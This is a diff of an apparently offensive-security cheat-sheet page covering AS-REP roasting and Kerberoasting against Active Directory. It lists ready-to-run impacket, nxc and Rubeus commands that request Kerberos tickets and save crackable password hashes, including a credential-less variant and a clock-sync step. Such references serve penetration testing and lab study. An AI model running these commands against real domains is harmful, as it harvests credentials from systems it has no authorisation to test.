@@ -50,17 +50,24 @@
   
   <li><a href="https://tldrbins.github.io/@getnpusers/">GetNPUsers</a></li>
   
-  <li><a href="https://tldrbins.github.io/@faketime/">Faketime</a></li>
-  
 </ul>
 
 <div class="content"><hr>
 <h3 id="as_rep-roasting">AS_REP Roasting</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10
-</span></span></code></pre></div><h3 id="kerberoasting-from-linux">Kerberoasting (From Linux)</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">faketime -f +8h impacket-GetNPUsers -request <span class="s1">&#39;example.com/user:password&#39;</span> -dc-ip 10.10.11.10 -save -outputfile GetUserSPNs.txt
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Multiple valid usernames</span>
+</span></span><span class="line"><span class="cl">impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Multiple valid usernames (nxc)</span>
+</span></span><span class="line"><span class="cl">nxc ldap 10.10.11.10 -u usernames.txt -p <span class="s1">&#39;&#39;</span> --asreproast as_rep_hashes.txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Single user without creds</span>
+</span></span><span class="line"><span class="cl">impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 example.com/user
+</span></span></code></pre></div><h3 id="kerberoasting">Kerberoasting</h3>
+<h4 id="from-linux">From Linux</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Fix time skew</span>
+</span></span><span class="line"><span class="cl">sudo ntpdate -s 10.10.11.10 <span class="o">&amp;&amp;</span> impacket-GetUserSPNs -request <span class="s1">&#39;example.com/username:password&#39;</span> -dc-ip 10.10.11.10
 </span></span></code></pre></div><p><small><em>Note: Times skew have to be within 5 minutes in kerberos</em></small></p>
-<h3 id="kerberoasting-from-windows">Kerberoasting (From Windows)</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Kerberoasting without cred</span>
+</span></span><span class="line"><span class="cl">sudo ntpdate -s 10.10.11.10 <span class="o">&amp;&amp;</span> impacket-GetUserSPNs -no-preauth &lt;USER_WITH_DONT_REQUIRE_PREAUTH&gt; -usersfile usernames.txt -dc-host 10.10.11.10 &lt;DOMAIN&gt;/
+</span></span></code></pre></div><h4 id="from-windows">From Windows</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">.\rubeus.exe kerberoast /creduser:example.com\username /credpassword:password
 </span></span></code></pre></div><br></div></div>
     
